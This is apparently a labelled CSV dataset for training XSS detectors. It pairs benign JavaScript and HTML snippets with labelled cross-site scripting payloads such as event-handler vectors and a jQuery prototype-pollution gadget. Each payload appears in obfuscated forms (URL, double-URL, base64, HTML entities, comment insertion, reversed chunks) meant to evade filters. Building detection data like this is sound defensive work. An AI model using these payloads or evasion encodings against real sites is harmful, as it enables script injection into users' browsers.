sample_id,label,payload_original,payload_obfuscated,generator,recipe
3477,0,this._observer.disconnect(),this._observer.disconnect(),llm_style_t1.0,none
3478,0,"this.dragtarget.addeventlistener('touchmove', this._handledragtargetdragbound)","this.dragtarget.addeventlistener('touchmove', this._handledragtargetdragbound)",llm_style_t1.0,none
3479,1,"<blockquote draggable=""true"" ondragleave=""alert(1)"">test</blockquote>","<blockquote draggable=""true"" ondragleave=""alert(1)"">test</blockquote>",llm_style_t1.0,comment_marker
3480,1,<table id=x tabindex=1 onbeforedeactivate=alert(1)></table><input autofocus>,<  table id=x tabindex=1 onbeforedeactivate=alert(1)></table><input autofocus>,llm_style_t1.0,whitespace_noise
3481,0,"this._setattributeifnotexists(target, 'role', 'tabpanel'); if (child.id) { this._setattributeifnotexists(target, 'aria-labelledby', `${child.id}`);","this._setattributeifnotexists(target, 'role', 'tabpanel'); if (child.id) { this._setattributeifnotexists(target, 'aria-labelledby', `${child.id}`);",llm_style_t1.0,none
3482,1,<u onpointerover=alert(1)>xss</u>,%26lt%3Bu%20onpointerover%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fu%26gt%3B,llm_style_t1.0,html_then_urlencode
3483,1,"<style>:target {color: red;}</style><kbd id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></kbd>",%3Cstyle%3E%3Atarget%20%7Bcolor%3A%20red%3B%7D%3C%2Fstyle%3E%3Ckbd%20id%3Dx%20style%3D%22transition%3Acolor%2010s%22%20ontransitioncancel%3Dalert%281%29%3E%3C%2Fkbd%3E,llm_style_t1.0,urlencode
3484,0,"this.el.addeventlistener('click', this._handlecarouselclickbound)","this.el.addeventlistener('click', this._handlecarouselclickbound)",llm_style_t1.0,none
3485,0,static get defaulttype() { return defaulttype$5; },static get defaulttype() { return defaulttype$5; },llm_style_t1.0,none
3486,0,"<li><a href=""/wiki/conventionalism"" title=""conventionalism"">conventionalism </a> </li>","<li><a href=""/wiki/conventionalism"" title=""conventionalism"">conventionalism </a> </li>",llm_style_t1.0,none
3487,1,<svg><spacer onload=alert(1)></spacer>,%3Csvg%3E%3Cspacer%20onload%3Dalert%281%29%3E%3C%2Fspacer%3E,llm_style_t1.0,urlencode
3488,1,"<legend onmouseleave=""alert(1)"">test</legend>",%26lt%3Blegend%20onmouseleave%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Flegend%26gt%3B,llm_style_t1.0,html_then_urlencode
3489,0,this.ishovered = false; this.isfocused = false; this._appendtooltipel();,this.ishovered = false; this.isfocused = false; this._appendtooltipel();,llm_style_t1.0,none
3490,0,"$textarea.css('height', hiddendiv.innerheight() + 'px'); } else if ($textarea[0].value.length < $textarea.data('previous-length')) { $textarea.css('height', $textarea.data('original-height') + 'px');","$textarea.css('height', hiddendiv.innerheight() + 'px'); } else if ($textarea[0].value.length < $textarea.data('previous-length')) { $textarea.css('height', $textarea.data('original-height') + 'px');",llm_style_t1.0,none
3491,0,"if (typeof window.ontouchstart !== 'undefined') { this.el.removeeventlistener('touchstart', this._handlecarouseltapbound); this.el.removeeventlistener('touchmove', this._handlecarouseldragbound);","if (typeof window.ontouchstart !== 'undefined') { this.el.removeeventlistener('touchstart', this._handlecarouseltapbound); this.el.removeeventlistener('touchmove', this._handlecarouseldragbound);",llm_style_t1.0,none
3492,0,"}, { key: ""_handlerangemousedowntouchstart"", value: function _handlerangemousedowntouchstart(e) {","}, { key: ""_handlerangemousedowntouchstart"", value: function _handlerangemousedowntouchstart(e) {",llm_style_t1.0,none
3493,0,if ( handlenumber === false ) { return false; },if ( handlenumber === false ) { return false; },llm_style_t1.0,none
3494,1,<figcaption onblur=alert(1) tabindex=1 id=x></figcaption><input autofocus>,%26lt%3Bfigcaption%20onblur%3Dalert%281%29%20tabindex%3D1%20id%3Dx%26gt%3B%20%20%26lt%3B%2Ffigcaption%26gt%3B%26lt%3Binput%20autofocus%26gt%3B,llm_style_t1.0,whitespace_noise+html_then_urlencode
3495,0,"document.removeeventlistener('scroll', pushpin._updateelements); } _updateposition() {","document.removeeventlistener('scroll', pushpin._updateelements); } _updateposition() {",llm_style_t1.0,none
3496,0,!$target.parent().hasclass('is-disabled') ) { this.setdate(,!$target.parent().hasclass('is-disabled') ) { this.setdate(,llm_style_t1.0,none
3497,0,"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 10.3, 17.5 </li> </ul>","<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 10.3, 17.5 </li> </ul>",llm_style_t1.0,none
3498,0,"return _get(timepicker.__proto__ || object.getprototypeof(timepicker), ""init"", this).call(this, this, els, options)","return _get(timepicker.__proto__ || object.getprototypeof(timepicker), ""init"", this).call(this, this, els, options)",llm_style_t1.0,none
3499,1,"<style>:target {color: red;}</style><menuitem id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></menuitem>",PHN0eWxlPjp0YXJnZXQge2NvbG9yOiByZWQ7fTwvc3R5bGU+PG1lbnVpdGVtIGlkPXggc3R5bGU9InRyYW5zaXRpb246Y29sb3IgMTBzIiBvbnRyYW5zaXRpb25jYW5jZWw9YWxlcnQoMSk+PC9tZW51aXRlbT4=,llm_style_t1.0,base64
3500,0,currchips.deletechip(index),currchips.deletechip(index),llm_style_t1.0,none
3501,0,return liel[0]; } _toggleentryfromarray(key) {,return liel[0]; } _toggleentryfromarray(key) {,llm_style_t1.0,none
3502,0,if (defaultprevented) {,if (defaultprevented) {,llm_style_t1.0,none
3503,1,<video onpointerenter=alert(1)>xss</video>,%253Cvideo%2520onpointerenter%253Dalert%25281%2529%253Exss%253C%252Fvideo%253E,llm_style_t1.0,double_urlencode
3504,0,} $(this).closest('.chip').remove(); });,} $(this).closest('.chip').remove(); });,llm_style_t1.0,none
3505,0,this.isfixed = this.el.classlist.contains('sidenav-fixed'),this.isfixed = this.el.classlist.contains('sidenav-fixed'),llm_style_t1.0,none
3506,0,"<p>many ai algorithms are capable of learning from data; they can enhance themselves by learning new <a href=""/wiki/heuristic_(computer_science)"" title=""heuristic (computer science)"">heuristics </a> (strategies, or ""rules of thumb"", that have worked well in the past), or can themselves write other algorithms. some of the ""learners"" described below, including bayesian networks, decision trees, and nearest-neighbor, could theoretically, (given infinite data, time, and memory) learn to approximate any <a href=""/wiki/function_(mathematics)"" title=""function (mathematics)"">function </a>, including which combination of mathematical functions would best describe the world<sup class=""noprint inline-template template-fact"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/wikipedia:citation_needed"" title=""wikipedia:citation needed""><span title=""this claim needs references to reliable sources. (june 2019)"">citation needed","<p>many ai algorithms are capable of learning from data; they can enhance themselves by learning new <a href=""/wiki/heuristic_(computer_science)"" title=""heuristic (computer science)"">heuristics </a> (strategies, or ""rules of thumb"", that have worked well in the past), or can themselves write other algorithms. some of the ""learners"" described below, including bayesian networks, decision trees, and nearest-neighbor, could theoretically, (given infinite data, time, and memory) learn to approximate any <a href=""/wiki/function_(mathematics)"" title=""function (mathematics)"">function </a>, including which combination of mathematical functions would best describe the world<sup class=""noprint inline-template template-fact"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/wikipedia:citation_needed"" title=""wikipedia:citation needed""><span title=""this claim needs references to reliable sources. (june 2019)"">citation needed",llm_style_t1.0,none
3507,0,"window.index.add({ href: 'http://materializecss.com/getting-started.html', title: 'getting started',","window.index.add({ href: 'http://materializecss.com/getting-started.html', title: 'getting started',",llm_style_t1.0,none
3508,0,_this26._setupeventhandlers(); return _this26; },_this26._setupeventhandlers(); return _this26; },llm_style_t1.0,none
3509,0,return name } dispose() {,return name } dispose() {,llm_style_t1.0,none
3510,0,"return document.queryselectorall(a); } catch (c) {} }function r(a, c) {","return document.queryselectorall(a); } catch (c) {} }function r(a, c) {",llm_style_t1.0,none
3511,0,"m.checkpossiblealignments = function(el, container, bounding, offset) {","m.checkpossiblealignments = function(el, container, bounding, offset) {",llm_style_t1.0,none
3512,0,this._scrollbar = new scrollbarhelper() this._addeventlisteners() },this._scrollbar = new scrollbarhelper() this._addeventlisteners() },llm_style_t1.0,none
3513,0,if (!object || typeof object !== 'object') { return false; },if (!object || typeof object !== 'object') { return false; },llm_style_t1.0,none
3514,0,"ripple.setattribute('style', convertstyle(ripplestyle)); }, hide: function (e) {","ripple.setattribute('style', convertstyle(ripplestyle)); }, hide: function (e) {",llm_style_t1.0,none
3515,1,"<style>:target {color:red;}</style><samp id=x style=""transition:color 1s"" ontransitionend=alert(1)></samp>",&lt;style&gt;:target {color:red;}&lt;/style&gt;&lt;samp id=x style=&quot;transition:color 1s&quot; ontransitionend=alert(1)&gt;&lt;/samp&gt;,llm_style_t1.0,html_entities
3516,0,return overflow[side] >= 0; }); },return overflow[side] >= 0; }); },llm_style_t1.0,none
3517,1,"<template oncontextmenu=""alert(1)"">test</template>",PHRlbXBsYXRlIG9uY29udGV4dG1lbnU9ImFsZXJ0KDEpIj50ZXN0PC90ZW1wbGF0ZT4=,llm_style_t1.0,base64
3518,0,if (this._ishovered === false) {,if (this._ishovered === false) {,llm_style_t1.0,none
3519,0,parallaxinstance._enabled = window.innerwidth > parallaxinstance.options.responsivethreshold,parallaxinstance._enabled = window.innerwidth > parallaxinstance.options.responsivethreshold,llm_style_t1.0,none
3520,0,if ( entry.min === undefined || entry.max === undefined ) {,if ( entry.min === undefined || entry.max === undefined ) {,llm_style_t1.0,none
3521,1,"b=""url(\"""";",b%253D%2522url%2528%255C%2522%2522%253B,llm_style_t1.0,whitespace_noise+double_urlencode
3522,0,"<li><a href=""/wiki/decision_theory"" title=""decision theory"">decision theory </a> </li>","<li><a href=""/wiki/decision_theory"" title=""decision theory"">decision theory </a> </li>",llm_style_t1.0,none
3523,0,"c[key] = node.dataset ? node.dataset[key] : cash(node).attr(""data-"" + key)","c[key] = node.dataset ? node.dataset[key] : cash(node).attr(""data-"" + key)",llm_style_t1.0,none
3524,1,"<q onpaste=""alert(1)"" contenteditable>test</q>",cT5zdDwvZT50ZXRhYmx0ZWRpbnRlbiIgY290KDEpYWxlcnRlPSJucGFzPHEgbw==,llm_style_t1.0,reverse_chunks+base64
3525,1,"<style>@keyframes slidein {}</style><nextid style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nextid>",&lt;style&gt;@keyframes slidein {}&lt;/style&gt;&lt;nextid style=&quot;animation-duration:1s;animation-name:slidein;animation-iteration-count:2&quot; onanimationiteration=&quot;alert(1)&quot;&gt;&lt;/nextid&gt;,llm_style_t1.0,html_entities
3526,0,"} else { element.setattribute(name, value === true ? '' : value); }","} else { element.setattribute(name, value === true ? '' : value); }",llm_style_t1.0,none
3527,0,"var uid = cash.uid = ""_cash"" + date.now()","var uid = cash.uid = ""_cash"" + date.now()",llm_style_t1.0,none
3528,0,"$(document).on('keyup', text_area_selector, function() { m.textareaautoresize($(this)); });","$(document).on('keyup', text_area_selector, function() { m.textareaautoresize($(this)); });",llm_style_t1.0,none
3529,0,"'<div class= ""modal timepicker-modal"">',","'<div class= ""modal timepicker-modal"">',",llm_style_t1.0,none
3530,0,return formatteddate,return formatteddate,llm_style_t1.0,none
3531,0,const event_mouseenter$1 = `mouseenter${event_key$8}`; const event_mouseleave$1 = `mouseleave${event_key$8}`; const event_drag_start = `dragstart${event_key$8}`;,const event_mouseenter$1 = `mouseenter${event_key$8}`; const event_mouseleave$1 = `mouseleave${event_key$8}`; const event_drag_start = `dragstart${event_key$8}`;,llm_style_t1.0,none
3532,0,"var opts = this.options,","var opts = this.options,",llm_style_t1.0,none
3533,0,"movehandles(movement > 0, proposal, data.locations, data.handlenumbers); } function eventend ( event, data ) {","movehandles(movement > 0, proposal, data.locations, data.handlenumbers); } function eventend ( event, data ) {",llm_style_t1.0,none
3534,0,value: function renderbody(rows) { return '<tbody>' + rows.join('') + '</tbody>'; },value: function renderbody(rows) { return '<tbody>' + rows.join('') + '</tbody>'; },llm_style_t1.0,none
3535,1,"<body onpaste=""alert(1)"" contenteditable>test</body>",%3Cbody%20on%2F%2AOBF%2A%2Fpaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fbody%3E,llm_style_t1.0,comment_marker+urlencode
3536,0,"return { top: box.top + win.pageyoffset - docelem.clienttop, left: box.left + win.pagexoffset - docelem.clientleft","return { top: box.top + win.pageyoffset - docelem.clienttop, left: box.left + win.pagexoffset - docelem.clientleft",llm_style_t1.0,none
3537,0,const toasttrigger = document.getelementbyid('livetoastbtn'),const toasttrigger = document.getelementbyid('livetoastbtn'),llm_style_t1.0,none
3538,1,"<address draggable=""true"" ondragenter=""alert(1)"">test</address>",&lt;address draggable=&quot;true&quot; ondragenter=&quot;alert(1)&quot;&gt;test&lt;/address&gt;,llm_style_t1.0,html_entities
3539,0,placement: state.placement })) : tetheroffset; var normalizedtetheroffsetvalue = typeof tetheroffsetvalue === 'number' ? {,placement: state.placement })) : tetheroffset; var normalizedtetheroffsetvalue = typeof tetheroffsetvalue === 'number' ? {,llm_style_t1.0,none
3540,0,return el.contains(selector); }); return this.filter(comparator);,return el.contains(selector); }); return this.filter(comparator);,llm_style_t1.0,none
3541,1,<p onpointerenter=alert(1)>xss</p>,%253Cp%2520onpointerenter%253Dalert%25281%2529%253Exss%253C%252Fp%253E,llm_style_t1.0,double_urlencode
3542,1,"<listing draggable=""true"" ondragleave=""alert(1)"">test</listing>",%26lt%3Blisting%20dragg/*OBF*/able%3D%26quot%3Btrue%26quot%3B%20ondragleave%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fli/*OBF*/sting%26gt%3B,llm_style_t1.0,html_then_urlencode+comment_marker
3543,1,"<input value = """" type = text>",PCBpbnB1dCB2YWx1ZSA9ICIiIHR5cGUgPSAgIHRleHQ+,llm_style_t1.0,whitespace_noise+base64
3544,0,"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">related </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">","</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">related </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",llm_style_t1.0,none
3545,0,"targets: this._overlay,","targets: this._overlay,",llm_style_t1.0,none
3546,0,"<dl class=""docutils"">","<dl class=""docutils"">",llm_style_t1.0,none
3547,0,"$optionli.prop('selected', notadded)","$optionli.prop('selected', notadded)",llm_style_t1.0,none
3548,0,"const class_name_dropdown_item = 'dropdown-item'; const class_name_active$1 = 'active'; const selector_data_spy = '[data-bs-spy=""scroll""]';","const class_name_dropdown_item = 'dropdown-item'; const class_name_active$1 = 'active'; const selector_data_spy = '[data-bs-spy=""scroll""]';",llm_style_t1.0,none
3549,0,"function eventstart ( event, data ) {","function eventstart ( event, data ) {",llm_style_t1.0,none
3550,1,"<div draggable=""true"" contenteditable>drag me</div><spacer ondrop=alert(1) contenteditable>drop here</spacer>",%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Cspacer%20ondrop%3Dalert%281%29%20contenteditable%3Edrop%20here%3C%2Fspacer%3E,llm_style_t1.0,urlencode
3551,0,state.modifiersdata[name] = data; } // eslint-disable-next-line import/no-unused-modules const preventoverflow$1 = {,state.modifiersdata[name] = data; } // eslint-disable-next-line import/no-unused-modules const preventoverflow$1 = {,llm_style_t1.0,none
3552,1,"<audio onkeydown=""alert(1)"" contenteditable>test</audio>",%3Caudio%20onkeydown%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Faudio%3E,llm_style_t1.0,urlencode+whitespace_noise
3553,0,_this68._setupeventhandlers(),_this68._setupeventhandlers(),llm_style_t1.0,none
3554,1,"<tfoot oncopy=""alert(1)"" contenteditable>test</tfoot>",%3Ctfoot%20oncopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Ftfoot%3E,llm_style_t1.0,urlencode
3555,1,<button autofocus onfocus=alert(1)>test</button>,%3Cbutton%20autofocus%20onfocus%3Dalert%281%29%3Etest%3C%2Fbutton%3E,llm_style_t1.0,urlencode
3556,0,"}, { key: ""_finishselection"", value: function _finishselection() {","}, { key: ""_finishselection"", value: function _finishselection() {",llm_style_t1.0,none
3557,0,"toggle(selector_dropdown_toggle, class_name_active); toggle(selector_dropdown_menu, class_name_show$1); outerelem.setattribute('aria-expanded', open);","toggle(selector_dropdown_toggle, class_name_active); toggle(selector_dropdown_menu, class_name_show$1); outerelem.setattribute('aria-expanded', open);",llm_style_t1.0,none
3558,0,deletechip(chipindex) {,deletechip(chipindex) {,llm_style_t1.0,none
3559,0,this.$modalel.insertbefore(this.el),this.$modalel.insertbefore(this.el),llm_style_t1.0,none
3560,1,"<big onmouseup=""alert(1)"">test</big>",PGJpZyBvbm1vdXNldXA9ICAiYWxlcnQoMSkiPiB0ZXN0PC8gYmlnPg==,llm_style_t1.0,whitespace_noise+base64
3561,1,"<datalist onpaste=""alert(1)"" contenteditable>test</datalist>",%3Cdatalist%20onpaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fdatalist%3E,llm_style_t1.0,urlencode
3562,0,if (isdisabled(this._element) || !this._isshown()) { return; },if (isdisabled(this._element) || !this._isshown()) { return; },llm_style_t1.0,none
3563,0,var $chips = $(this).closest('.chips'),var $chips = $(this).closest('.chips'),llm_style_t1.0,none
3564,0,"autocomplete._keydown = true; var keycode = e.keycode, lielement = void 0,","autocomplete._keydown = true; var keycode = e.keycode, lielement = void 0,",llm_style_t1.0,none
3565,1,"<samp onkeydown=""alert(1)"" contenteditable>test</samp>",%3Csamp%20onkeydown%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fsamp%3E,llm_style_t1.0,urlencode
3566,0,value: function _handleinputfocus() {,value: function _handleinputfocus() {,llm_style_t1.0,none
3567,1,"<cite onbeforepaste=""alert(1)"" contenteditable>test</cite>",JTI1M0NjaXRlJTI1MjBvbmJlZm9yZXBhc3RlJTI1M0QlMjUyMmFsZXJ0JTI1MjgxJTI1MjklMjUyMiUyNTIwY29udGVudGVkaXRhYmxlJTI1M0V0ZXN0JTI1M0MlMjUyRmNpdGUlMjUzRQ==,llm_style_t1.0,double_urlencode+base64
3568,1,<main onpointerdown=alert(1)>xss</main>,%253Cmain%2520onpointerdown%253Dalert%25281%2529%253Exss%253C%252Fmain%253E,llm_style_t1.0,double_urlencode
3569,0,cleartimeout(timeout),cleartimeout(timeout),llm_style_t1.0,none
3570,0,break; case 'vertical': parsed.ort = 1;,break; case 'vertical': parsed.ort = 1;,llm_style_t1.0,none
3571,0,"let _defaults = { indicators: true, height: 400,","let _defaults = { indicators: true, height: 400,",llm_style_t1.0,none
3572,0,"parsed.animate = entry; if ( typeof entry !== 'boolean' ){ throw new error(""nouislider: 'animate' option must be a boolean."");","parsed.animate = entry; if ( typeof entry !== 'boolean' ){ throw new error(""nouislider: 'animate' option must be a boolean."");",llm_style_t1.0,none
3573,0,return array.isarray(a) ? a : [a]; } function countdecimals ( numstr ) {,return array.isarray(a) ? a : [a]; } function countdecimals ( numstr ) {,llm_style_t1.0,none
3574,1,"<style>:target {color:red;}</style><plaintext id=x style=""transition:color 1s"" ontransitionend=alert(1)></plaintext>",%26lt%3Bstyle%26gt%3B%3Atarget%20%7Bcolor%3Ared%3B%7D%26lt%3B%2Fstyle%26gt%3B%26lt%3Bplaintext%20id%3Dx%20style%3D%26quot%3Btransition%3Acolor%201s%26quot%3B%20ontransitionend%3Dalert%281%29%26gt%3B%26lt%3B%2Fplaintext%26gt%3B,llm_style_t1.0,html_then_urlencode
3575,1,"<style>@keyframes slidein {}</style><section style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></section>",%3Cstyle%3E%40keyframes%20slidein%20%7B%7D%3C%2Fstyle%3E%3Csection%20style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22%20onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fsection%3E,llm_style_t1.0,urlencode
3576,0,"function hydrateobj(obj, meta = {}) { for (const [key, value] of object.entries(meta)) { try {","function hydrateobj(obj, meta = {}) { for (const [key, value] of object.entries(meta)) { try {",llm_style_t1.0,none
3577,1,"<ol ondblclick=""alert(1)"">test</ol>",%253Col%2520ondblclick%253D%2522alert%25281%2529%2522%253Etest%253C%252Fol%253E,llm_style_t1.0,double_urlencode
3578,0,var checks = []; if (checkmainaxis) { checks.push(overflow[_baseplacement] <= 0);,var checks = []; if (checkmainaxis) { checks.push(overflow[_baseplacement] <= 0);,llm_style_t1.0,none
3579,1,<html onpointerover=alert(1)>xss</html>,ml>/htss<)>xt(1lerr=aoveteroinonpml <ht,llm_style_t1.0,reverse_chunks
3580,0,} else { this.offsetx = 40; },} else { this.offsetx = 40; },llm_style_t1.0,none
3581,1,<var onpointerleave=alert(1)>xss</var>,&lt;var onpointerleave=alert(1)&gt;xss&lt;/var&gt;,llm_style_t1.0,html_entities
3582,0,"<li id=""cite_note-77""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-77"">^ </a> </b>","<li id=""cite_note-77""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-77"">^ </a> </b>",llm_style_t1.0,none
3583,1,<iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>,PGlmcmFtZSBpZD14IHRhYmluZGV4PTEgb25iZWZvcmVkZWFjdGl2YXRlPWFsZXJ0KDEpPjwvaWZyYW1lPjxpbnB1dCBhdXRvZm9jdXM+,llm_style_t1.0,base64
3584,0,"<dd><a href=""/en/master/"">master</a></dd>","<dd><a href=""/en/master/"">master</a></dd>",llm_style_t1.0,none
3585,0,this._createdragtarget(),this._createdragtarget(),llm_style_t1.0,none
3586,0,"this.el.addeventlistener('click', this._handleinputclickbound); this.container.addeventlistener( 'mousedown',","this.el.addeventlistener('click', this._handleinputclickbound); this.container.addeventlistener( 'mousedown',",llm_style_t1.0,none
3587,1,<details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>,<details id=x tabindex=1 onbeforedeactivate=alert(1)></details><input autofocus>,llm_style_t1.0,whitespace_noise
3588,0,"}, parents(element, selector) { const parents = []","}, parents(element, selector) { const parents = []",llm_style_t1.0,none
3589,0,"const data = { set(element, key, instance) { if (!elementmap.has(element)) {","const data = { set(element, key, instance) { if (!elementmap.has(element)) {",llm_style_t1.0,none
3590,0,selected = this._toggleentryfromarray(key); } else { $(this.dropdownoptions).find('li').removeclass('selected');,selected = this._toggleentryfromarray(key); } else { $(this.dropdownoptions).find('li').removeclass('selected');,llm_style_t1.0,none
3591,0,"} eventhandler.on(document, event_click_data_api$5, selector_data_slide, function (event) { const target = selectorengine.getelementfromselector(this);","} eventhandler.on(document, event_click_data_api$5, selector_data_slide, function (event) { const target = selectorengine.getelementfromselector(this);",llm_style_t1.0,none
3592,0,const targetelement = entry => this._targetlinks.get(`#${entry.target.id}`) const activate = entry => { this._previousscrolldata.visibleentrytop = entry.target.offsettop,const targetelement = entry => this._targetlinks.get(`#${entry.target.id}`) const activate = entry => { this._previousscrolldata.visibleentrytop = entry.target.offsettop,llm_style_t1.0,none
3593,1,"<figcaption onbeforecut=""alert(1)"" contenteditable>test</figcaption>",%253Cfigcaption%2520onbeforecut%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Ffigcaption%253E,llm_style_t1.0,urlencode+html_then_urlencode
3594,0,"return component; }(); ; // required for meteor package, the use of window prevents export by meteor","return component; }(); ; // required for meteor package, the use of window prevents export by meteor",llm_style_t1.0,none
3595,1,<acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>,<acronym id=x ta/*OBF*/binde/*OBF*/x=1 ondeactivate=alert(1)></acronym><in/*OBF*/put id=y autofocus>,llm_style_t1.0,comment_marker
3596,0,for (var a in obj) { if (obj.hasownproperty(a)) { style += a + ':' + obj[a] + ';';,for (var a in obj) { if (obj.hasownproperty(a)) { style += a + ':' + obj[a] + ';';,llm_style_t1.0,none
3597,1,"<noframes onbeforecopy=""alert(1)"" contenteditable>test</noframes>",&lt;noframes onbeforecopy=&quot;alert(1)&quot; contenteditable&gt;test&lt;/noframes&gt;,llm_style_t1.0,html_entities
3598,0,this.el.classlist.remove('pinned'),this.el.classlist.remove('pinned'),llm_style_t1.0,none
3599,0,"</span> </a> </i>&#93; </sup>. many deep learning systems need to be able to learn chains ten or more causal links in length.<sup id=""cite_ref-schmidhuber2015_246-0"" class=""reference""><a href=""#cite_note-schmidhuber2015-246"">&#91;235&#93; </a> </sup> deep learning has transformed many important subfields of artificial intelligence<sup class=""noprint inline-template"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/wikipedia:please_clarify"" title=""wikipedia:please clarify""><span title=""the reason for this is unclear. (july 2019)"">why?","</span> </a> </i>&#93; </sup>. many deep learning systems need to be able to learn chains ten or more causal links in length.<sup id=""cite_ref-schmidhuber2015_246-0"" class=""reference""><a href=""#cite_note-schmidhuber2015-246"">&#91;235&#93; </a> </sup> deep learning has transformed many important subfields of artificial intelligence<sup class=""noprint inline-template"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/wikipedia:please_clarify"" title=""wikipedia:please clarify""><span title=""the reason for this is unclear. (july 2019)"">why?",llm_style_t1.0,none
3600,0,var wrapper = document.createelement('i'); wrapper.classname = el.classname + ' waves-input-wrapper'; var elementstyle = el.getattribute('style');,var wrapper = document.createelement('i'); wrapper.classname = el.classname + ' waves-input-wrapper'; var elementstyle = el.getattribute('style');,llm_style_t1.0,none
3601,0,const placement_left = isrtl() ? 'right-start' : 'left-start'; const placement_topcenter = 'top'; const placement_bottomcenter = 'bottom';,const placement_left = isrtl() ? 'right-start' : 'left-start'; const placement_topcenter = 'top'; const placement_bottomcenter = 'bottom';,llm_style_t1.0,none
3602,1,<script> object.prototype.preventdefault='x'; object.prototype.handleobj='x'; object.prototype.delegatetarget='<img/src/onerror=alert(1)>'; /* no extra code needed for jquery 1 & 2 */$(document).off('foobar'); </script>,%26lt%3Bscript%26gt%3B%20object.prototype.preventdefault%3D%26%23x27%3Bx%26%23x27%3B%3B%20object.prototype.handleobj%3D%26%23x27%3Bx%26%23x27%3B%3B%20object.prototype.delegatetarget%3D%26%23x27%3B%26lt%3Bimg%2Fsrc%2Fonerror%3Dalert%281%29%26gt%3B%26%23x27%3B%3B%20%2F%2A%20no%20extra%20code%20needed%20for%20jquery%201%20%26amp%3B%202%20%2A%2F%24%28document%29.off%28%26%23x27%3Bfoobar%26%23x27%3B%29%3B%20%26lt%3B%2Fscript%26gt%3B,llm_style_t1.0,html_then_urlencode
3603,1,"<bgsound onbeforecopy=""alert(1)"" contenteditable>test</bgsound>",PGJnc291bmQgb25iZWZvcmVjb3B5PSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L2Jnc291bmQ+,llm_style_t1.0,base64
3604,0,(function (r) { m.anime = r(); })(function () {,(function (r) { m.anime = r(); })(function () {,llm_style_t1.0,none
3605,0,"const selector_data_toggle_active = `.${class_name_active}[data-bs-toggle=""tab""], .${class_name_active}[data-bs-toggle=""pill""], .${class_name_active}[data-bs-toggle=""list""]` class tab extends basecomponent { constructor(element) {","const selector_data_toggle_active = `.${class_name_active}[data-bs-toggle=""tab""], .${class_name_active}[data-bs-toggle=""pill""], .${class_name_active}[data-bs-toggle=""list""]` class tab extends basecomponent { constructor(element) {",llm_style_t1.0,none
3606,1,"<body onkeydown=""alert(1)"" contenteditable>test</body>","<body onkeydown="" alert(1)"" contenteditable>test</body>",llm_style_t1.0,whitespace_noise
3607,0,_handleyearchange(e) {,_handleyearchange(e) {,llm_style_t1.0,none
